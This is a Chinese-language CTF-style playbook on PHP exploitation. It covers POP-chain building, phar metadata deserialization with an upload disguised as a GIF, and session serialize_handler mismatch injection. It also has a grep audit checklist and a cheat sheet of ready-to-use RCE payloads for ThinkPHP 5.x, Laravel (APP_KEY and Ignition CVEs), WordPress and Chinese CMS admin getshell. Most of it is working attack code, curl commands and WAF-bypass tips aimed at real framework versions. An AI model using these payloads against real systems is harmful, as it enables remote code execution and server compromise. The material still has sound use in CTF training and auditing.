## [g-php-deser] 反序列化——格式、魔术方法、POP 链、phar 与 session

### [php-pop-chain] POP 链构造从零到实战 | hard | PHP;POP链;反序列化 | gadget;RCE
> 有入口无魔术方法直接 RCE 时，串普通类方法直到危险 sink
#### 这个条目的作用
POP（Property-Oriented Programming，面向属性编程）：入口只有一个可控的 `unserialize()` 参数、但没有任何一个魔术方法直接调用危险函数时，靠「可控属性值 + 一串普通方法与魔术方法（__destruct / __toString / __call / __get 等）」把数据一路带到 eval / system / file_put_contents 等 sink。完整方法论就四步：找 sink → 反推调用链 → 找触发点 → 拼 payload。链任何长度都不可怕，跟着源码一步步走就行。
#### 前置条件
- 会看序列化格式（`O:4:"User":1:{...}`）与属性可见性前缀
- 熟悉魔术方法触发时机（__wakeup / __destruct / __toString / __call / __get）
- 一份可读源码 + 一个 `unserialize($_GET[$x])` 类的入口
#### 第 1 步：从 sink 出发，而不是从入口出发
先别管入口。grep 危险函数，拿到候选 sink 清单：
```bash
grep -rn "eval\|system\|exec\|assert\|call_user_func\|file_put_contents\|preg_replace" 源码目录
```
对每个 sink 记录三件事：在哪个类、被哪个方法调用、参数来自哪个属性。命中太多就优先挑「参数来自对象属性」的（这样属性可控才有意义）。
预期结果：一张「类 → 方法 → sink」的候选表。
#### 第 2 步：反推调用链（谁调用了它）
对每个候选 sink 问「谁调用了这个方法」：可能是同类其它方法、父类方法、或某个魔术方法。手工跟读时优先找这三类触发点：
- `__destruct`：对象销毁时自动执行，最稳的链起点
- `__toString`：对象被拼接到字符串 / echo 时触发，常在日志、报错、模板里被隐式调用
- `__call`：调用不存在的方法时把方法名和参数转发，天然的「调度器」
预期结果：画出一条或多条「魔术方法 → 中间方法 → sink」的完整调用链。
#### 第 3 步：梳理可控属性
链上每个环节用到的属性，都得能从序列化串里赋值。写 payload 前先用（本地）`serialize(new X)` 生成参考串，再对照目标源码手改属性值。可见性前缀：
```txt
public     s:4:"name";                 # 最省事，直接用
protected  s:7:"\0*\0name";            # \0 是字节 0x00
private    s:12:"\0ClassName\0name";   # 前缀里带类名（不含命名空间反斜杠时注意）
```
长度是「字节数」，\0 也算一个字节，数错就属性丢失。
#### 第 4 步：手写 / 生成 payload
手写骨架：`O:<类名长度>:<类名>:<属性数>:{<属性>}`。嫌手数麻烦就用脚本或工具生成。目标类是框架类时直接用 phpggc：
```bash
phpggc -l                  # 列出所有可用链
phpggc Laravel/RCE1 system id   # 生成现成 payload（自带 __destruct 起点）
```
#### 第 5 步：本地验证再打靶
本地装同版本 PHP，最小复现：定义同名同结构的类，unserialize 后观察魔术方法是否按预期触发：
```php
<?php
class User { public $cmd = 'id'; function __destruct(){ system($this->cmd); } }
$o = unserialize('O:4:"User":1:{s:3:"cmd";s:2:"id";}');
```
验证通过后再 URL 编码提交：`\0` 编码为 `%00`，引号 / 花括号 / 冒号在 query 里一般直接可用。
预期结果：本地命令执行成功，靶场同样触发。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 属性没进 sink | 属性名或长度数错 | 用 serialize() 生成参考串逐字节对 |
| private/protected 属性一直为空 | \0 前缀形式或长度不对 | 用 urlencode 查看 %00 的确切位置 |
| 本地能打、靶场不行 | 类名/命名空间/版本差异 | 对照靶场源码重写，phpggc 链注意框架版本 |
| __destruct 不触发 | 对象没被销毁 / 脚本中途 exit | 让反序列化发生在脚本自然结束前 |
| 被 WAF 拦 | payload 含危险函数关键字 | 分段拼接、动态调用、URL 编码 |
#### 实战要点
- 先 grep sink 再想链，别从入口瞎跟
- __destruct 是最常用起点；__toString 常用于「隐式触发」层
- 框架题优先 phpggc（Laravel / ThinkPHP / WordPress 全有现成链）
- 手写 payload 全程走「本地生成 → 修改 → 验证」闭环，别纯手数
- 版本差异是通病：PHP 8 下 assert 字符串执行 / create_function 已死，链里别用

### [php-phar-deser] phar 反序列化 | medium | PHP;phar;反序列化 | phar://;触发点
> 不需要 unserialize() 的任何文件操作都可能触发：phar:// 元数据反序列化
#### 这个条目的作用
phar（PHP Archive）文件由四部分组成：stub（可伪装文件头 + 结尾必须 `__HALT_COMPILER();`）+ manifest（内含 metadata，已序列化存储）+ 文件内容 + 签名。当代码里**任何文件函数**以 `phar://` 协议访问这个文件时，PHP 会解析 manifest 并对 metadata 执行反序列化——即使整个源码里根本没有 unserialize()。配合一条 POP 链（见 php-pop-chain）即可 RCE。核心打法：可写文件 → 生成带恶意 metadata 的 phar → 伪装后缀上传 → 用 `phar://` 触发任意文件函数。
#### 前置条件
- 一个可写文件的位置（上传 / file_put_contents / 可控日志）
- 一个路径可控的文件操作点，如 `file_exists($_GET['f'])`、`include($x)`、`unlink($f)`
- 一条作用于目标代码的 POP 链（框架题可直接把 phpggc 链塞进 metadata）
#### 第 1 步：确认 phar 扩展与 phar.readonly
phpinfo 里 phar 扩展应存在。生成 phar 需要 `phar.readonly=Off`（默认 On），本地生成时加参数：
```bash
php -d phar.readonly=Off gen.php
```
预期结果：脚本无警告地生成 .phar 文件。
#### 第 2 步：写生成脚本
```php
<?php
// 与靶机代码里同名同结构（类名/命名空间/属性）的类即可
class User { public $cmd = 'id'; function __destruct(){ system($this->cmd); } }
$p = new Phar('shell.phar');
$p->startBuffering();
$p->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); // 伪造成 GIF 过文件头检查
$p->setMetadata(new User);                        // 这才是被反序列化的载荷
$p->addFromString('t.txt', 'x');                  // 触发路径里要「存在」的文件
$p->stopBuffering();
```
metadata 会被序列化存进 manifest；触发时整条 POP 链从这里开始恢复对象。若靶机类是框架类，用 phpggc 输出序列化串，再配合工具把它写进 manifest 也行。
#### 第 3 步：伪装并上传
把 `shell.phar` 改名 `shell.gif`（或 .jpg/.png）走上传点；服务端只查后缀或文件头也能过（stub 里已经是 GIF89a）。上传点无内容检查时保留 .phar 后缀更稳。
预期结果：上传成功，文件内容仍是完整 phar 结构。
#### 第 4 步：触发反序列化
找到路径可控的文件函数，把参数换成：
```txt
phar://uploads/shell.gif/t.txt
```
例如 `file_exists('phar://uploads/shell.gif/t.txt')`——路径里的 `/t.txt` 就是 addFromString 加进去的那个文件，目的是让 phar 能被正常打开。触发后 metadata 被反序列化，User 对象创建，对象销毁时 __destruct 执行 `system('id')`。
预期结果：命令输出 / 延迟 / 报错，任一回显都说明触发成功。
#### 第 5 步：PHP 8.0+ 的差异
PHP 8.0 起 phar 流包装器默认**不再自动反序列化** metadata（要显式 getMetadata() 或依赖个别仍走内部反序列化的函数/扩展）。老靶场（7.x）直接打；目标是 PHP 8 时先确认版本再决定路线。用 phpinfo 或报错泄露判版本。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 生成报 warning / 失败 | phar.readonly=On | 加 `-d phar.readonly=Off` |
| 触发无反应 | PHP 8.0+ 默认不反序列化 metadata | 换 7.x 环境理解 / 找仍触发的函数 |
| 类不存在 / 属性为空 | 靶机类名或命名空间与本地不一致 | 对照源码重建同结构类 |
| include 报错 | phar 路径写错或文件不存在 | 确认上传目录与 addFromString 的文件名 |
| 上传被拦 | 后缀/魔数检查 | stub 换 JPEG/PNG 头，或换上传入口 |
#### 实战要点
- file_exists / is_file 是低可疑度触发点（无输出、无报错）
- getimagesize、unlink、md5_file、include、move_uploaded_file 等都能触发，逐个试
- stub 必须以 `__HALT_COMPILER();` 结尾才是合法 phar
- 链类名必须与靶机一致，本地验证好再上传
- PHP 8 靶场优先考虑别的反序列化入口，别在 phar 上死磕

### [php-session-deser] Session 反序列化 | medium | PHP;Session;反序列化 | session.serialize_handler
> 处理引擎不一致导致的 session 文件解析错位利用
#### 这个条目的作用
php.ini 的 `session.serialize_handler` 决定 session 文件怎么写、怎么读，共三种格式：`php`、`php_serialize`、`php_binary`。写入侧与读取侧用了**不同 handler** 时解析会错位：写入端按 A 格式拼文件，读取端按 B 格式切分，于是放进 session 的「可控字符串」有可能被读取端当成序列化对象数据 `unserialize`，进而触发 POP 链 RCE。典型场景：登录页 `ini_set('session.serialize_handler','php_serialize')`，另一个页面用默认 `php` 读取。
#### 前置条件
- 靶场源码（确认两个页面的 handler 与 session 键名）
- 一个能把可控字符串写进 session 的入口（如用户名直接做 `$_SESSION['username']=$name`）
- 一条 POP 链（见 php-pop-chain）
#### 第 1 步：确认两侧 handler
phpinfo 或源码找 `session.serialize_handler`。注意 `ini_set(...)` 只在**当前脚本**生效——正是「登录页 php_serialize 写入、其它页 php 读取」这组不一致最好打。
预期结果：确认写入与读取的 handler 不同；相同则这条路不通。
#### 第 2 步：背下三种格式
```txt
php:           username|s:5:"admin";            # 键|序列化值，竖线分割
php_serialize: a:1:{s:8:"username";s:5:"admin";}   # 整个文件是一个 serialize() 数组
php_binary:    \x08username s:5:"admin";        # 键长一个字节 + 键名 + 值
```
关键点：php_serialize 格式写入的内容里，`|` 会出现在**字符串内部**——这就是错位的入口。
#### 第 3 步：构造错位 payload（php_serialize 写 → php 读）
登录页写入时 `$_SESSION['username']` 可控，把它设为「一个竖线 + 你的 POP 链」：
```txt
|O:4:"User":1:{s:3:"cmd";s:2:"id";}
```
写入后 session 文件（php_serialize 格式）长这样：
```txt
a:1:{s:8:"username";s:35:"|O:4:"User":1:{s:3:"cmd";s:2:"id";}";}
```
读取页用 php 格式解析：按**第一个 `|`** 分割 → 键是 `a:1:{s:8:"username";s:35:"`，值是 `O:4:"User":1:{s:3:"cmd";s:2:"id";}";}` → 对值 `unserialize()` → User 对象创建，析构时执行命令。多出来的尾部 `";}` 会被 unserialize 自动忽略。
#### 第 4 步：用脚本生成，别手数长度
`s:35` 的 35 是字节数，链一长手数必错。本地跑：
```php
<?php
$val = '|O:4:"User":1:{s:3:"cmd";s:2:"id";}';
echo 'a:1:{s:8:"username";s:' . strlen($val) . ':"' . $val . '";}';
```
把输出里的长度自动对齐，再把整个 `$val` 当用户名提交到登录页。
#### 第 5 步：验证
访问读取页（session_start 且使用该键的页面），观察 __destruct / __wakeup 的输出或延迟。也可以在读取页构造 `echo $_SESSION['username']` 观察对象行为变化。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 完全不触发 | 两侧 handler 相同 / 读取页没 session_start | 确认 ini_set 只改了写入页 |
| 解析错位失败 | s:N 长度不对 | 用脚本生成 payload |
| 对象属性为空 | 类名/属性名与目标不一致 | 对照源码 |
| 写入时被转义 | 登录处有 addslashes 等处理 | 看源码转义逻辑，payload 相应调整 |
| PHP 8 无效 | 版本差异 / handler 默认值变化 | 先确认版本再打 |
#### 实战要点
- 核心只有一句：写入用 A 格式、读取用 B 格式，`|` 变成可控分隔符
- 判定点：读取该 session 的页面必须真去反序列化才触发，别在写入页打
- 主流组合就是 php / php_serialize，php_binary 少见
- session 文件路径 `/tmp/sess_<PHPSESSID>` 可读时，可直接改文件内容再触发
- 「session 文件包含」（session.upload_progress 把内容写进 /tmp/sess_* 再 include）是另一条同源思路

## [g-php-audit] 代码审计——grep 清单、漏洞模式与框架速查

### [php-audit-checklist] PHP 代码审计 grep 清单 | medium | PHP;审计;checklist | grep;危险函数
> 拿到源码 5 分钟内该搜什么：危险函数、参数入口、过滤缺失
#### 这个条目的作用
把审计变成「三点连线」：入口（超全局变量）→ 过滤（有没有、可不可绕）→ sink（危险函数）。每条漏洞本质上都是一个「入口可达 + 过滤缺失/可绕 + 危险 sink」的三元组。下面是直接可跑的 grep 清单，按顺序执行，5 分钟出候选清单。
#### 前置条件
- 一份源码（备份泄露 / 反编译 / git 历史）
- ripgrep（rg）或 `grep -rn`（带行号）
#### 第 1 步：入口清单（输入点）
```bash
rg -n '\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES)\[' .
rg -n '\$_(GET|POST|REQUEST)\b' .
```
再补搜间接入口：`extract(`、`parse_str(`、`import_request_variables(`、`$$`（变量变量）、`$GLOBALS`、`$_SESSION`、`$_FILES`。把每个入口记下「在哪行、什么键、是否被过滤」。
#### 第 2 步：sink 清单（危险函数）
```bash
rg -n 'system\(|exec\(|shell_exec\(|passthru\(|popen\(|proc_open\(|pcntl_exec\(' .
rg -n 'eval\(|assert\(|call_user_func(_array)?\(|create_function\(|preg_replace\(' .
rg -n 'include |require |include_once|require_once|file_get_contents\(|file_put_contents\(|fwrite\(|unlink\(|rename\(|readfile\(' .
rg -n 'query\(|mysqli_query|->query\(|->exec\(|->where\(' .
rg -n 'unserialize\(|json_decode\(' .
```
每条命中记录：所在文件/类、传入参数是否含第 1 步的超全局变量。
#### 第 3 步：过滤清单（先过滤再 sink）
```bash
rg -n 'addslashes\(|htmlspecialchars\(|htmlentities\(|intval\(|is_numeric\(|real_escape_string\(|preg_match\(|in_array\(|str_replace\(' .
```
目标是搞清「谁过滤了什么」：过滤出现在 sink 前才算数；同时评估可绕性（intval 只影响开头、preg_match 单次匹配、大小写/编码变换、数组参数绕过）。
#### 第 4 步：连线找洞
对每个 sink 向上找数据流：入口 → 变换函数 → sink。命中规则：
- 入口可达 && 无过滤（或过滤可绕） && sink 危险 → 写 PoC
- 注意「二次传递」：include 进来的文件、全局变量污染、日志/上传文件落盘后再 include
#### 第 5 步：优先级与手工跟读
先审无鉴权路径（login / register / api / upload / 下载导出），再跟典型点：move_uploaded_file 的目标路径、下载功能的 filename 参数、模板变量渲染、`include $x` 的 $x 来源。有 composer.json / composer.lock 的话对照依赖版本查已知 CVE，往往比纯手工快。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 直连链找不到洞 | 漏洞藏在文件包含/二次传递 | 追踪 include 与全局变量污染 |
| grep 命中爆炸 | 危险函数名被当普通标识符 | 精确到 `xxx\(`，排除 `function xxx` 声明 |
| 以为有过滤其实没有 | 过滤在别的分支/函数外 | 看完整调用路径，别只看 sink 前一行 |
| 过滤看似的确拦了 | 单次 preg_match / 编码绕过 | 试大小写、%00、url 编码、数组参数 |
#### 实战要点
- 先找过滤函数表，优先打「完全没过滤」的 sink
- unserialize 入口单独列一行，配合反序列化 POP 链打
- upload / download 类功能键在文件名参数，必查路径穿越与写入
- 有 composer.lock 先查已知 CVE 版本，能省一半时间
- 每条 PoC 先小范围验证，再上完整请求

### [php-cms-framework] ThinkPHP/Laravel 常见洞速查 | medium | PHP;框架;CVE | ThinkPHP;Laravel
> 主流 PHP 框架与 CMS 的经典 RCE/文件泄漏位
#### 这个条目的作用
打框架题的正确顺序是「指纹 → 版本 → payload」：先确认是什么框架、什么版本，再对照速查表打对应已知漏洞。下面覆盖最常考的 ThinkPHP 5.x 系列 RCE、Laravel 的 .env 泄露 / Ignition RCE、WordPress 插件与主题、DedeCMS / 帝国 CMS 后台 getshell。
#### 前置条件
- 一个能访问的目标 URL
- curl 或 burp；注意反斜杠在部分环境需要 URL 编码
#### 第 1 步：指纹确认
- ThinkPHP：URL 形如 `/index.php?s=/index/xxx`；访问不存在路由时的报错页泄露 "ThinkPHP V5.0.23" 版本号
- Laravel：老版本 `/_ignition/health-check` 返回 200；`/.env` 直接可读；报错页是 Laravel 风格并可能带出路径
- WordPress：`/wp-login.php`、`/wp-content/`、`/xmlrpc.php` 存在
- DedeCMS：`/dede/` 后台目录、`/data/` 目录
- 帝国CMS：`/e/` 目录特征
预期结果：确定框架与版本号（版本可从报错页 / 源码注释 / 静态资源 meta 里找）。
#### 第 2 步：ThinkPHP 速查表
| 版本 | Payload |
|---|---|
| TP 2.x | `?s=/index/index/index/name/${@phpinfo()}`（preg_replace /e 代码执行） |
| TP 5.0.x（≤5.0.23） | `?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id` |
| TP 5.1.x 早期 | `?s=/index/\think\Request/input&filter[]=system&data=id` |
| TP 5.1.x 早期 | `?s=/index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id` |
请求示例（5.0.x）：
```bash
curl "http://target/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
```
预期结果：输出 id 结果。无回显换 `filter[]=phpinfo&data=1` 验证；若 400/404，把反斜杠改成 `%5C` 编码重试。
#### 第 3 步：Laravel 速查
- 直接访问 `/.env`（debug 模式配置不当），拿到 `APP_KEY` → CVE-2018-15133：用 APP_KEY 加密 phpggc 生成的 Laravel 反序列化链，放进 `X-XSRF-TOKEN` 请求头触发 RCE（该头会被 CSRF 中间件解密并 unserialize）
- CVE-2021-3129（Ignition ≤ 2.5.1）：POST `/_ignition/execute-solution`，`solution` 设为 `Facade\Ignition\Solutions\MakeViewVariableOptionalSolution`，`parameters.viewFile` 指到 `storage/logs/laravel.log`，data 构造清除日志并把 php 代码注入日志的载荷，再触发反序列化 RCE；直接用公开 exp（GitHub 搜 Ignition RCE）即可
- 报错页泄露的绝对路径与 debug 状态也值得记录
#### 第 4 步：WordPress 与国产 CMS
- WordPress：插件/主题目录 `/wp-content/plugins/`、`/wp-content/themes/`；有管理员权限时「外观 → 主题编辑器」直接改 php 文件 getshell；`/wp-json/wp/v2/users` 用户枚举、xmlrpc 爆破算辅助
- DedeCMS 5.7：后台（/dede/）弱口令 → 文件管理/模板里直接写 php；历史版本有前台漏洞，对照版本查 exp
- 帝国CMS：后台（/e/ 相关）getshell 类漏洞常在后台功能里，先弱口令/爆破后台路径
预期结果：按指纹命中一条可利用链。
#### 第 5 步：验证与兜底
有回显直接看输出；无回显用 `sleep 5` 或 dnslog 盲验证。payload 无效就回第 1 步细分版本（5.0.23 / 5.0.24 / 5.1.31 是分界点），换对应链，别原地重试同一 payload。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| payload 无效 | 版本已修补 | 细分版本换链（5.0.23 后换 5.1 链、5.1.31 后换 CVE） |
| 反斜杠 400/404 | 反斜杠被 Web 组件处理 | 用 %5C 编码或二次编码试 |
| filter[] 无输出 | 版本不对 / 输出被吞 | 换 Container/invokefunction 链或盲打 dnslog |
| /.env 404 | debug 关闭 | 换 Ignition / 报错泄露路径 |
| 后台弱口令失败 | 默认口令已改 | 爆破 + 查历史 exp 组合 |
#### 实战要点
- 先指纹后打，别拿着 payload 乱试
- ThinkPHP 报错页直接给版本号，第一时间看
- 框架题可先看 vulhub 对应镜像环境，payload 逐版本验证
- WordPress 插件漏洞用 wpscan 或按插件名查公开 exp
- 打前存一个请求快照，payload 无回显时回头看版本再换链